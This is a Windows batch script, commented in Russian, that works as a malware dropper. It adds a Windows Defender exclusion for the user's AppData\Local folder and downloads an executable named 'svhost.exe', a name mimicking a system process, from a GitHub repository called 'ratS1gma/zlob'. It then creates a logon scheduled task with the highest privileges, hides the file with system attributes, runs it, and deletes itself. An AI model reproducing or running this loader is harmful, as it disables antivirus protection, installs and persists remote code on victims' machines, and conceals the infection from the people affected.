@echo off
setlocal

:: Устанавливаем путь к файлу и месту его загрузки
set "url=https://github.com/ratS1gma/zlob/raw/refs/heads/main/svhost.exe"
set "outputFileName=svhost.exe"

:: Используем PowerShell для получения пути к папке AppData\Local
for /f %%i in ('powershell -NoProfile -Command "[Environment]::GetFolderPath('LocalApplicationData')"') do set "outputFolder=%%i"
set "outputFilePath=%outputFolder%\%outputFileName%"

:: Добавляем исключение в Защитник Windows
echo [*] Adding folder
powershell -NoProfile -Command "try { Add-MpPreference -ExclusionPath '%outputFolder%'; Write-Host 'Successfully added exclusion.' -ForegroundColor Green } catch { Write-Host 'Failed to add exclusion.' -ForegroundColor Red; exit 1 }"

timeout /t 1 >nul

:: Скачиваем файл
echo [*] Downloading file to %outputFilePath% ...
powershell -NoProfile -Command "try { Invoke-WebRequest -Uri '%url%' -OutFile '%outputFilePath%'; Write-Host 'File downloaded.' -ForegroundColor Green } catch { Write-Host 'Failed to download file.' -ForegroundColor Red; exit 1 }"

:: Проверка наличия файла
if not exist "%outputFilePath%" (
    echo [!] File was not downloaded. Exiting.
    exit /b 1
)

:: Добавляем задачу в автозагрузку
echo [*] Creating scheduled task...
schtasks /create /tn "test_in_autostart" /tr "\"%outputFilePath%\"" /sc onlogon /rl highest /f

:: Скрытие файла
echo [*] Hiding file...
attrib +h +s "%outputFilePath%"

:: Запускаем файл
echo [*] Running file...
start "" "%outputFilePath%"

:: Самоудаление
del "%~f0"

echo [*] Done.
